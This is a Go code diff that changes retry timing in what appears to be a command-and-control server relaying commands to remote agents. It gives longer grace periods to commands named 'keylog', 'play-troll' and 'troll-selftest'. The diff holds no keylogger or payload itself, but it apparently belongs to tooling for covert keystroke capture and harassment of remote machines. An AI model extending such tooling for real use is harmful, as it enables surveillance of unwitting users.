@@ -533,7 +533,38 @@ func (s *Server) ackCmd(cmdID string) {
 	s.pendingMu.Unlock()
 }
 
-// cmdRetryLoop resends relay commands that produced no output within 10s.
+// retryGraceFor returns how long to wait before resending a command
+// with no output. A blanket 10s resends long-running commands that are
+// executing fine (play-troll proves up to 60s+) — the resend is deduped,
+// pure noise plus a confusing log line. Known-long verbs get room;
+// everything else keeps the 10s tripwire. Pure for unit tests.
+func retryGraceFor(cmd string) time.Duration {
+	lc := strings.ToLower(strings.TrimSpace(cmd))
+	name := lc
+	if i := strings.IndexAny(name, " \t"); i >= 0 {
+		name = name[:i]
+	}
+	switch name {
+	case "play-troll":
+		return 75 * time.Second
+	case "keylog":
+		secs := 0
+		fmt.Sscanf(strings.TrimSpace(lc[len(name):]), "%d", &secs)
+		if secs < 1 {
+			secs = 60
+		}
+		if secs > 3600 {
+			secs = 3600
+		}
+		return time.Duration(secs+30) * time.Second
+	case "troll-selftest", "send-notification":
+		return 45 * time.Second
+	}
+	return 10 * time.Second
+}
+
+// cmdRetryLoop resends relay commands that produced no output within
+// their grace period (10s default, longer for known-long commands).
 // Normal commands: one retry then forgotten after 2min (at-most-once exec,
 // at-least-once delivery). Mode commands: retry forever every 10s with a
 // fresh CmdID (idempotent, dedup-bypassed) until the hello confirms — so a
@@ -577,12 +608,12 @@ func (s *Server) cmdRetryLoop() {
 				}
 				continue
 			}
-			if age > 10e9 && p.retries < 1 {
-				p.retries++
-				s.pendingMu.Unlock()
-				if ac := s.getAgentByID(p.targetID); ac != nil {
-					log.Printf("[retry] %s no output in 10s, resending via %s", id, ac.id)
-					_ = s.sendToAgent(ac, p.msg)
+		if age > int64(retryGraceFor(p.msg.Cmd)) && p.retries < 1 {
+			p.retries++
+			s.pendingMu.Unlock()
+			if ac := s.getAgentByID(p.targetID); ac != nil {
+				log.Printf("[retry] %s no output in %v, resending via %s", id, retryGraceFor(p.msg.Cmd), ac.id)
+				_ = s.sendToAgent(ac, p.msg)
 				} else {
 					s.pendingMu.Lock()
 					delete(s.pending, id)
